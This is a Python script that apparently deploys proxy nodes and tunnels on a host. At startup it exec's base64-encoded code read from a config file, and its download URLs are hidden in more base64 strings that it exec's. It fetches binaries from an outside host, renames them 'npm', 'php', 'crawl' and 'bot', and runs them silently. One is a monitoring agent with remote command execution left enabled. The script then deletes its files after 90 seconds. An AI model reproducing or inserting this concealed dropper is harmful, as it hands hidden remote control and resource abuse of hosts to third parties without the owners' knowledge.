import os
import re
import json
import time
import base64
import shutil
import asyncio
import requests
import subprocess
import threading
from threading import Thread

def set_env():
    with open('env.conf', 'r', encoding='utf-8') as file:
        content = file.read().strip()
    decoded_bytes = base64.b64decode(content)
    code_content = decoded_bytes.decode('utf-8')
    exec(code_content, globals())   
set_env()
# Execute shell command and return output
def exec_cmd(command):
    try:
        process = subprocess.Popen(
            command, 
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()
        return stdout.strip()
    except Exception as e:
        print(f"Error executing command: {e}")
        return null

# Create running folder
def create_directory():
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)
        print(f"{os.path.abspath(FILE_PATH)} is created")
    # else:
    #     print(f"{FILE_PATH} already exists")

# Global variables
npm_path = os.path.join(FILE_PATH, 'npm')
php_path = os.path.join(FILE_PATH, 'php')
crawl_path = os.path.join(FILE_PATH, 'crawl')
bot_path = os.path.join(FILE_PATH, 'bot')
sub_path = os.path.join(FILE_PATH, 'sub.txt')
list_path = os.path.join(FILE_PATH, 'list.txt')
boot_log_path = os.path.join(FILE_PATH, 'boot.log')
config_path = os.path.join(FILE_PATH, 'config.json')


# Clean up old files
def cleanup_old_files():
    paths_to_delete = ['crawl', 'bot', 'npm', 'php', 'boot.log', 'list.txt']
    for file in paths_to_delete:
        file_path = os.path.join(FILE_PATH, file)
        try:
            if os.path.exists(file_path):
                if os.path.isdir(file_path):
                    shutil.rmtree(file_path)
                else:
                    os.remove(file_path)
        except Exception as e:
            print(f"Error removing {file_path}: {e}")
  
# Determine system architecture
def get_system_architecture():
    # architecture = platform.machine().lower()
    architecture = exec_cmd("uname -m").lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    else:
        return 'amd'

# Download file based on architecture
def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        response = requests.get(file_url, stream=True)
        response.raise_for_status()
        
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print(f"Download {file_name} successfully")
        return True
    except Exception as e:
        if os.path.exists(file_path):
            os.remove(file_path)
        print(f"Download {file_name} failed: {e}")
        return False

# Get files for architecture
def get_files_for_architecture(architecture):
    #####
    fun='aWYgYXJjaGl0ZWN0dXJlID09ICdhcm0nOgoJYmFzZV9maWxlcyA9IFsKCQl7ImZpbGVOYW1lIjogImNyYXdsIiwgImZpbGVVcmwiOiAiaHR0cHM6Ly9hcm02NC5zc3NzLm55Yy5tbi93ZWIifSwKCQl7ImZpbGVOYW1lIjogImJvdCIsICJmaWxlVXJsIjogImh0dHBzOi8vYXJtNjQuc3Nzcy5ueWMubW4vMmdvIn0KCV0KZWxzZToKCWJhc2VfZmlsZXMgPSBbCgkJeyJmaWxlTmFtZSI6ICJjcmF3bCIsICJmaWxlVXJsIjogImh0dHBzOi8vYW1kNjQuc3Nzcy5ueWMubW4vd2ViIn0sCgkJeyJmaWxlTmFtZSI6ICJib3QiLCAiZmlsZVVybCI6ICJodHRwczovL2FtZDY0LnNzc3MubnljLm1uLzJnbyJ9CgldCgppZiBORVpIQV9TRVJWRVIgYW5kIE5FWkhBX0tFWToKCWlmIE5FWkhBX1BPUlQ6CgkJbnBtX3VybCA9ICJodHRwczovL2FybTY0LnNzc3MubnljLm1uL2FnZW50IiBpZiBhcmNoaXRlY3R1cmUgPT0gJ2FybScgZWxzZSAiaHR0cHM6Ly9hbWQ2NC5zc3NzLm55Yy5tbi9hZ2VudCIKCQliYXNlX2ZpbGVzLmluc2VydCgwLCB7ImZpbGVOYW1lIjogIm5wbSIsICJmaWxlVXJsIjogbnBtX3VybH0pCgllbHNlOgoJCXBocF91cmwgPSAiaHR0cHM6Ly9hcm02NC5zc3NzLm55Yy5tbi92MSIgaWYgYXJjaGl0ZWN0dXJlID09ICdhcm0nIGVsc2UgImh0dHBzOi8vYW1kNjQuc3Nzcy5ueWMubW4vdjEiCgkJYmFzZV9maWxlcy5pbnNlcnQoMCwgeyJmaWxlTmFtZSI6ICJwaHAiLCAiZmlsZVVybCI6IHBocF91cmx9KQ=='
    fun=base64.b64decode(fun).decode('utf-8')
    result = {
        'architecture': architecture,
        'NEZHA_SERVER': NEZHA_SERVER,
        'NEZHA_KEY': NEZHA_KEY,
        'NEZHA_PORT': NEZHA_PORT
    }
    exec(fun, {}, result)
    base_files=result.get('base_files')
    #####
    return base_files

# Authorize files with execute permission
def authorize_files(file_paths):
    for relative_file_path in file_paths:
        absolute_file_path = os.path.join(FILE_PATH, relative_file_path)
        if os.path.exists(absolute_file_path):
            try:
                os.chmod(absolute_file_path, 0o775)
                print(f"Empowerment success for {absolute_file_path}: 775")
            except Exception as e:
                print(f"Empowerment failed for {absolute_file_path}: {e}")

# Configure Argo tunnel
def argo_type():
    if not ARGO_AUTH or not ARGO_DOMAIN:
        # print("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels")
        return

    if "TunnelSecret" in ARGO_AUTH:
        with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as f:
            f.write(ARGO_AUTH)
        
        tunnel_id = ARGO_AUTH.split('"')[11]
        tunnel_yml = f"""
tunnel: {tunnel_id}
credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: {ARGO_DOMAIN}
    service: http://localhost:{ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
"""
        with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as f:
            f.write(tunnel_yml)
    else:
        # print("Use token connect to tunnel,please set the {ARGO_PORT} in cloudflare")
        return


# Download and run necessary files
async def download_files_and_run():
    global private_key, public_key
    
    architecture = get_system_architecture()
    files_to_download = get_files_for_architecture(architecture)
    
    if not files_to_download:
        print("Can't find a file for the current architecture")
        return
    
    # Download all files
    download_success = True
    for file_info in files_to_download:
        if not download_file(file_info["fileName"], file_info["fileUrl"]):
            download_success = False
    
    if not download_success:
        print("Error downloading files")
        return
    
    # Authorize files
    files_to_authorize = ['npm', 'crawl', 'bot'] if NEZHA_PORT else ['php', 'crawl', 'bot']
    authorize_files(files_to_authorize)
    
    # Check TLS
    port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else ""
    if port in ["443", "8443", "2096", "2087", "2083", "2053"]:
        nezha_tls = "true"
    else:
        nezha_tls = "false"

    # Configure nezha
    if NEZHA_SERVER and NEZHA_KEY:
        if not NEZHA_PORT:
            # Generate config.yaml for v1
            config_yaml = f"""
client_secret: {NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 4
server: {NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: {nezha_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {UUID}"""
            
            with open(os.path.join(FILE_PATH, 'config.yaml'), 'w') as f:
                f.write(config_yaml)
    
    # Generate configuration file
    #####
    config_str='Y29uZmlnPXsibG9nIjp7ImFjY2VzcyI6Ii9kZXYvbnVsbCIsImVycm9yIjoiL2Rldi9udWxsIiwibG9nbGV2ZWwiOiJub25lIix9LCJpbmJvdW5kcyI6W3sicG9ydCI6QVJHT19QT1JUICwicHJvdG9jb2wiOiJ2bGVzcyIsInNldHRpbmdzIjp7ImNsaWVudHMiOlt7ImlkIjpVVUlEICwiZmxvdyI6Inh0bHMtcnByeC12aXNpb24iLH0sXSwiZGVjcnlwdGlvbiI6Im5vbmUiLCJmYWxsYmFja3MiOlt7ImRlc3QiOjMwMDEgfSx7InBhdGgiOiIvdmxlc3MtYXJnbyIsImRlc3QiOjMwMDIgfSx7InBhdGgiOiIvdm1lc3MtYXJnbyIsImRlc3QiOjMwMDMgfSx7InBhdGgiOiIvdHJvamFuLWFyZ28iLCJkZXN0IjozMDA0IH0sXSx9LCJzdHJlYW1TZXR0aW5ncyI6eyJuZXR3b3JrIjoidGNwIix9LH0seyJwb3J0IjozMDAxICwibGlzdGVuIjoiMTI3LjAuMC4xIiwicHJvdG9jb2wiOiJ2bGVzcyIsInNldHRpbmdzIjp7ImNsaWVudHMiOlt7ImlkIjpVVUlEIH0sXSwiZGVjcnlwdGlvbiI6Im5vbmUifSwic3RyZWFtU2V0dGluZ3MiOnsibmV0d29yayI6IndzIiwic2VjdXJpdHkiOiJub25lIn19LHsicG9ydCI6MzAwMiAsImxpc3RlbiI6IjEyNy4wLjAuMSIsInByb3RvY29sIjoidmxlc3MiLCJzZXR0aW5ncyI6eyJjbGllbnRzIjpbeyJpZCI6VVVJRCAsImxldmVsIjowIH1dLCJkZWNyeXB0aW9uIjoibm9uZSJ9LCJzdHJlYW1TZXR0aW5ncyI6eyJuZXR3b3JrIjoid3MiLCJzZWN1cml0eSI6Im5vbmUiLCJ3c1NldHRpbmdzIjp7InBhdGgiOiIvdmxlc3MtYXJnbyJ9fSwic25pZmZpbmciOnsiZW5hYmxlZCI6VHJ1ZSAsImRlc3RPdmVycmlkZSI6WyJodHRwIiwidGxzIiwicXVpYyJdLCJtZXRhZGF0YU9ubHkiOkZhbHNlIH19LHsicG9ydCI6MzAwMyAsImxpc3RlbiI6IjEyNy4wLjAuMSIsInByb3RvY29sIjoidm1lc3MiLCJzZXR0aW5ncyI6eyJjbGllbnRzIjpbeyJpZCI6VVVJRCAsImFsdGVySWQiOjAgfV19LCJzdHJlYW1TZXR0aW5ncyI6eyJuZXR3b3JrIjoid3MiLCJ3c1NldHRpbmdzIjp7InBhdGgiOiIvdm1lc3MtYXJnbyJ9fSwic25pZmZpbmciOnsiZW5hYmxlZCI6VHJ1ZSAsImRlc3RPdmVycmlkZSI6WyJodHRwIiwidGxzIiwicXVpYyJdLCJtZXRhZGF0YU9ubHkiOkZhbHNlIH19LHsicG9ydCI6MzAwNCAsImxpc3RlbiI6IjEyNy4wLjAuMSIsInByb3RvY29sIjoidHJvamFuIiwic2V0dGluZ3MiOnsiY2xpZW50cyI6W3sicGFzc3dvcmQiOlVVSUQgfSxdfSwic3RyZWFtU2V0dGluZ3MiOnsibmV0d29yayI6IndzIiwic2VjdXJpdHkiOiJub25lIiwid3NTZXR0aW5ncyI6eyJwYXRoIjoiL3Ryb2phbi1hcmdvIn19LCJzbmlmZmluZyI6eyJlbmFibGVkIjpUcnVlICwiZGVzdE92ZXJyaWRlIjpbImh0dHAiLCJ0bHMiLCJxdWljIl0sIm1ldGFkYXRhT25seSI6RmFsc2UgfX0sXSwib3V0Ym91bmRzIjpbeyJwcm90b2NvbCI6ImZyZWVkb20iLCJ0YWciOiAiZGlyZWN0IiB9LHsicHJvdG9jb2wiOiJibGFja2hvbGUiLCJ0YWciOiJibG9jayJ9XX0='
    config_str=base64.b64decode(config_str).decode('utf-8')
    config_obj = {'UUID': UUID,'ARGO_PORT': ARGO_PORT}
    exec(config_str, {}, config_obj)
    config=config_obj.get('config')
    ##### 替换原来的config
   
    with open(os.path.join(FILE_PATH, 'config.json'), 'w', encoding='utf-8') as config_file:
        json.dump(config, config_file, ensure_ascii=False, indent=2)
    
    # Run nezha
    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
        tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
        nezha_tls = '--tls' if NEZHA_PORT in tls_ports else ''
        command = f"nohup {os.path.join(FILE_PATH, 'npm')} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls} >/dev/null 2>&1 &"
        
        try:
            exec_cmd(command)
            print('npm is running')
            time.sleep(1)
        except Exception as e:
            print(f"npm running error: {e}")
    
    elif NEZHA_SERVER and NEZHA_KEY:
        # Run V1
        command = f"nohup {FILE_PATH}/php -c \"{FILE_PATH}/config.yaml\" >/dev/null 2>&1 &"
        try:
            exec_cmd(command)
            print('php is running')
            time.sleep(1)
        except Exception as e:
            print(f"php running error: {e}")
    else:
        print('NEZHA variable is empty, skipping running')
    
    # Run sbX
    command = f"nohup {os.path.join(FILE_PATH, 'crawl')} -c {os.path.join(FILE_PATH, 'config.json')} >/dev/null 2>&1 &"
    try:
        exec_cmd(command)
        # print('crawl is  running')
        time.sleep(1)
    except Exception as e:
        print(f"crawl running error: {e}")
    
    # Run cloudflared
    if os.path.exists(os.path.join(FILE_PATH, 'bot')):
        if re.match(r'^[A-Z0-9a-z=]{120,250}$', ARGO_AUTH):
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {ARGO_AUTH}"
        elif "TunnelSecret" in ARGO_AUTH:
            args = f"tunnel --edge-ip-version auto --config {os.path.join(FILE_PATH, 'tunnel.yml')} run"
        else:
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {os.path.join(FILE_PATH, 'boot.log')} --loglevel info --url http://localhost:{ARGO_PORT}"

        try:
            exec_cmd(f"nohup {os.path.join(FILE_PATH, 'bot')} {args} >/dev/null 2>&1 &")
            # print('bot is running')
            time.sleep(2)
        except Exception as e:
            print(f"Error executing command: {e}")
    
    time.sleep(5)
    
    # Extract domains and generate sub.txt
    await extract_domains()

# Extract domains from cloudflared logs
async def extract_domains():
    argo_domain = None

    if ARGO_AUTH and ARGO_DOMAIN:
        argo_domain = ARGO_DOMAIN
        print(f'ARGO_DOMAIN: {argo_domain}')
        await generate_links(argo_domain)
    else:
        try:
            with open(boot_log_path, 'r') as f:
                file_content = f.read()
            
            lines = file_content.split('\n')
            argo_domains = []
            
            for line in lines:
                domain_match = re.search(r'https?://([^ ]*trycloudflare\.com)/?', line)
                if domain_match:
                    domain = domain_match.group(1)
                    argo_domains.append(domain)
            
            if argo_domains:
                argo_domain = argo_domains[0]
                # print(f'ArgoDomain: {argo_domain}')
                await generate_links(argo_domain)
            else:
                print('ArgoDomain not found, re-running bot to obtain ArgoDomain')
                # Remove boot.log and restart bot
                if os.path.exists(boot_log_path):
                    os.remove(boot_log_path)
                
                try:
                    exec_cmd('pkill -f "[b]ot" > /dev/null 2>&1')
                except:
                    pass
                
                time.sleep(1)
                args = f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{ARGO_PORT}'
                exec_cmd(f'nohup {os.path.join(FILE_PATH, "bot")} {args} >/dev/null 2>&1 &')
                # print('bot is running.')
                time.sleep(6)  # Wait 6 seconds
                await extract_domains()  # Try again
        except Exception as e:
            print(f'Error reading boot.log: {e}')

# Generate links and subscription content
async def generate_links(argo_domain):
    meta_info = exec_cmd('curl -s https://speed.cloudflare.com/meta')
    meta_info = meta_info.split('"')
    ISP = f"【{meta_info[25]}】"
    time.sleep(2)
    #####
    link_str='bm9kZSA9IHsidiI6ICIyIiwgInBzIjogZiJ7TkFNRX0te0lTUH0tMSIsICJhZGQiOiBDRklQLCAicG9ydCI6IENGUE9SVCwgImlkIjogVVVJRCwgImFpZCI6ICIwIiwgInNjeSI6ICJub25lIiwgIm5ldCI6ICJ3cyIsICJ0eXBlIjogIm5vbmUiLCAiaG9zdCI6IGFyZ29fZG9tYWluLCAicGF0aCI6ICIvdm1lc3MtYXJnbz9lZD0yNTYwIiwgInRscyI6ICJ0bHMiLCAic25pIjogYXJnb19kb21haW4sICJhbHBuIjogIiIsICJmcCI6ICJjaHJvbWUifQ=='
    link_str=base64.b64decode(link_str).decode('utf-8')
    link_obj = {"NAME":NAME,"ISP":ISP,"CFIP":CFIP,"CFPORT":CFPORT,"UUID":UUID,"argo_domain":argo_domain}
    exec(link_str, {}, link_obj)
    _link1=link_obj.get('node')
    link1=base64.b64encode(json.dumps(_link1).encode('utf-8')).decode('utf-8')
    list_str = 'bGlzdF90eHQgPSBmIiIiCnZtZXNzOi8ve2xpbmsxfQoKdmxlc3M6Ly97VVVJRH1Ae0NGSVB9OntDRlBPUlR9P2VuY3J5cHRpb249bm9uZSZzZWN1cml0eT10bHMmc25pPXthcmdvX2RvbWFpbn0mZnA9Y2hyb21lJnR5cGU9d3MmaG9zdD17YXJnb19kb21haW59JnBhdGg9JTJGdmxlc3MtYXJnbyUzRmVkJTNEMjU2MCN7TkFNRX0te0lTUH0tMgoKdHJvamFuOi8ve1VVSUR9QHtDRklQfTp7Q0ZQT1JUfT9zZWN1cml0eT10bHMmc25pPXthcmdvX2RvbWFpbn0mZnA9Y2hyb21lJnR5cGU9d3MmaG9zdD17YXJnb19kb21haW59JnBhdGg9JTJGdHJvamFuLWFyZ28lM0ZlZCUzRDI1NjAje05BTUV9LXtJU1B9LTMKIiIi'
    list_str=base64.b64decode(list_str).decode('utf-8')
    link_obj['link1']=link1
    exec(list_str, {}, link_obj)
    list_txt=link_obj.get('list_txt')
    ##### 替换原来的list_txt
    
    with open(os.path.join(FILE_PATH, 'list.txt'), 'w', encoding='utf-8') as list_file:
        list_file.write(list_txt)

    sub_txt = base64.b64encode(list_txt.encode('utf-8')).decode('utf-8')
    with open(os.path.join(FILE_PATH, 'sub.txt'), 'w', encoding='utf-8') as sub_file:
        sub_file.write(sub_txt)
    print(f"{FILE_PATH}/sub.txt saved successfully")
    return sub_txt   
 
# Clean up files after 90 seconds
def clean_files():
    def _cleanup():
        time.sleep(90)  # Wait 90 seconds
        files_to_delete = [boot_log_path, config_path, list_path, crawl_path, bot_path, php_path, npm_path,sub_path]

        for file in files_to_delete:
            try:
                if os.path.exists(file):
                    if os.path.isdir(file):
                        shutil.rmtree(file)
                    else:
                        os.remove(file)
            except:
                pass
        
        print('App is running')
        print('Thank you for using this script, enjoy!')
    
    threading.Thread(target=_cleanup, daemon=True).start()
    
# Main function to start the server

async def start_sbx():
    cleanup_old_files()
    create_directory()
    argo_type()
    await download_files_and_run()
    clean_files() 


def run_start():
    crawl_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(crawl_loop)
    crawl_loop.run_until_complete(start_sbx()) 
    crawl_loop.close()

def run_stop():
    exec_cmd('pkill -f crawl > /dev/null 2>&1')
    exec_cmd('pkill  bot > /dev/null 2>&1')
    time.sleep(3)
    clean_files() 
    
    

def get_links(type='sub'):
    running=exec_cmd('ps -ef|grep cache/crawl |grep -v grep')
    if running:
        status='running'
    else:
        status='stopped'
    sub=''
    data={"status":status,"data":sub,"running":running}
    if os.path.exists(sub_path):
        with open(sub_path, 'r', encoding='utf-8') as sub_file:
            sub = sub_file.read()
        data.update({"data":sub})
    result=json.dumps(data).encode('utf-8')
    if type=='sub':
        return result
    else:
        return sub
    

# Create Web Tunnel 
def create_web_tunnel():
    create_directory()
    if WEB_ARGO_DOMAIN and WEB_ARGO_AUTH:
        architecture = get_system_architecture()
        webargourl=f'https://{architecture}64.ssss.nyc.mn/2go'
        download_file('web_tunnel', webargourl)
        web_bot_path=os.path.join(FILE_PATH, 'web_tunnel')
        ext=os.path.exists(web_bot_path)
        exec_cmd(f'chmod +x {web_bot_path}')
        web_args=f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {WEB_ARGO_AUTH}"
        exec_cmd(f"nohup {web_bot_path} {web_args} >/dev/null 2>&1 &")
        print('Web tunnel is running')
        time.sleep(3)
        
        return True
    else:
        return False


if __name__ == "__main__":
    create_web_tunnel()
